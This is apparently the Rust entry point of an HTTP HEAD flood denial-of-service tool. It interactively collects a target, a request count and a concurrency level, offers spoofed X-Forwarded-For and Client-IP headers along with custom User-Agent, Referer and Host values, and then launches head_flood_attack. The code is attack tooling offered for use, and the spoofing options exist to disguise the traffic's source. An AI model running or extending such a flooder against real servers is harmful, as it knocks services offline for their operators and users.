mod head_flood;
mod ascii_art;

use head_flood::AttackOptions;
use rustyline::Editor;
use rustyline::history::DefaultHistory;
// -------------------------
// Programmer       : Ebrahim Shafiei (EbraSha)
// Email            : Prof.Shafiei@Gmail.com
// -------------------------

// Read string input using rustyline (supports Backspace, history, editing)
fn read_input(prompt: &str) -> String {
    let mut rl = Editor::<(), DefaultHistory>::new().unwrap();
    match rl.readline(prompt) {
        Ok(line) => line.trim().to_string(),
        Err(_) => {
            println!("Error reading input.");
            "".to_string()
        }
    }
}


// Read and parse input as usize
fn read_usize(prompt: &str) -> usize {
    loop {
        let input = read_input(prompt);
        if let Ok(val) = input.parse() {
            return val;
        }
        println!("Please enter a valid number.");
    }
}

// Select Connection header interactively
fn select_connection_header() -> Option<String> {
    println!("\nSelect Connection header:");
    println!("1. keep-alive");
    println!("2. close");
    println!("3. upgrade");
    println!("4. None (don’t include Connection header)");

    loop {
        let choice = read_input("Enter option [1-4]: ");
        match choice.as_str() {
            "1" => return Some("keep-alive".to_string()),
            "2" => return Some("close".to_string()),
            "3" => return Some("upgrade".to_string()),
            "4" => return None,
            _ => println!("Invalid choice. Please enter 1 to 4."),
        }
    }
}

#[tokio::main]
async fn main() {
    ascii_art::print_ascii_art_cyberpunk();

    let target = read_input("Enter target URL or IP: ");
    let total_requests = read_usize("Enter total number of requests: ");
    let concurrency = read_usize("Enter concurrency level (threads): ");

    let show_requests = read_input("Show each request? (y/n): ").to_lowercase() == "y";
    let show_responses = read_input("Show server responses? (y/n): ").to_lowercase() == "y";

    let user_agents = if read_input("Provide custom User-Agent list? (y/n): ").to_lowercase() == "y" {
        println!("Enter each User-Agent (type 'done' to finish):");
        let mut list = vec![];
        loop {
            let ua = read_input("> ");
            if ua.to_lowercase() == "done" {
                break;
            }
            list.push(ua);
        }
        Some(list)
    } else {
        None
    };

    let referers = if read_input("Provide custom Referer list? (y/n): ").to_lowercase() == "y" {
        println!("Enter each Referer (type 'done' to finish):");
        let mut list = vec![];
        loop {
            let ref_ = read_input("> ");
            if ref_.to_lowercase() == "done" {
                break;
            }
            list.push(ref_);
        }
        Some(list)
    } else {
        None
    };

    let spoof_ip = read_input("Spoof IP headers? (y/n): ").to_lowercase() == "y";
    let (spoofed_ip, client_ip) = if spoof_ip {
        let xff = read_input("Enter X-Forwarded-For IP: ");
        let cip = read_input("Enter Client-IP: ");
        (Some(xff), Some(cip))
    } else {
        (None, None)
    };

    let connection = select_connection_header();

    let custom_host = if read_input("Use specific Host header? (y/n): ").to_lowercase() == "y" {
        Some(read_input("Enter Host value: "))
    } else {
        None
    };

    let options = AttackOptions {
        show_requests,
        show_responses,
        user_agents,
        referers,
        spoof_ip,
        spoofed_ip,
        client_ip,
        connection,
        custom_host,
    };

    head_flood::head_flood_attack(
        &target,
        total_requests,
        concurrency,
        options,
    ).await;
}
